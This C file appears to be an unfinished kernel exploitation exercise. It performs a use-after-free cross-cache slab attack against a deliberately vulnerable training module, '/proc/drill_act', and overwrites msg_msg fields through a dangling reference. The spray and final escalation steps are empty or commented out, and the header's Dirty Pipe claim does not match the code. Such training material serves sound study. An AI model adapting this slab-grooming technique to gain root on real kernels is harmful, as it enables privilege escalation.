/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Currently, this PoC performs the Dirty Pipe attack for LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include "drill.h"

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

//#define MSG_OOB_SIZE	0x2000
//#define MSG_OOB_TYPE	0xc001

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
 *  - perform uaf write using the dangling reference
 *  - execute the exploit primitive via the overwritten target object
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go spraying\n");

	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
	

	printf("[!] perform uaf write using the dangling reference\n");
	/*
	 * Overwrite msg_msg m_type:
	 *  - m_type in msg_msg is at the offset 16;
	 *  - DRILL_ACT_SAVE_VAL with 0 as 2nd argument also starts at the offset 16.
	 */
	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_TYPE) " 0");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	/*
	 * Overwrite msg_msg size m_ts:
	 *  - m_ts in msg_msg is at the offset 24;
	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
	 */
	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_SIZE) " 8");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[!] execute the exploit primitive via the overwritten target object\n");
	

	/*
	if (getuid() == 0 && geteuid() == 0) {
		printf("[+] finish as: uid=0, euid=0, start sh...\n");
		run_sh();
		ret = EXIT_SUCCESS;
	} else {
		printf("[-] privesc\n");
	}
	*/

end:
	printf("[!] finishing this PoC exploit\n");

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
		printf("  closed the drill_act fd\n");
	}

	return ret;
}
